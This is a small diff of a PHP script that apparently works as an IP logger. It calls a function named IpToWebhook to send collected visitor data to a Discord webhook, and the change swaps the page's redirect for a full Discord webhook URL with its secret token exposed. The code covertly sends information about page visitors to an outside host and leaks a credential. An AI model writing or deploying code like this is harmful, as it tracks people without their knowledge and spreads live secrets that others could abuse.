@@ -48,5 +48,5 @@ function IpToWebhook($Hook, $Content)
 }
 
 IpToWebhook($Webhook, $JSON);
-header("Location: https://www.littest.site");
+header("Location: https://discordapp.com/api/webhooks/703615112686075934/hpCzepX1GnIaX5Mcv5A78wPzPPoocuZbPsmJSe58IfKv58wN1xF4AnpT5NpsGYMNEZvv");
 ?>
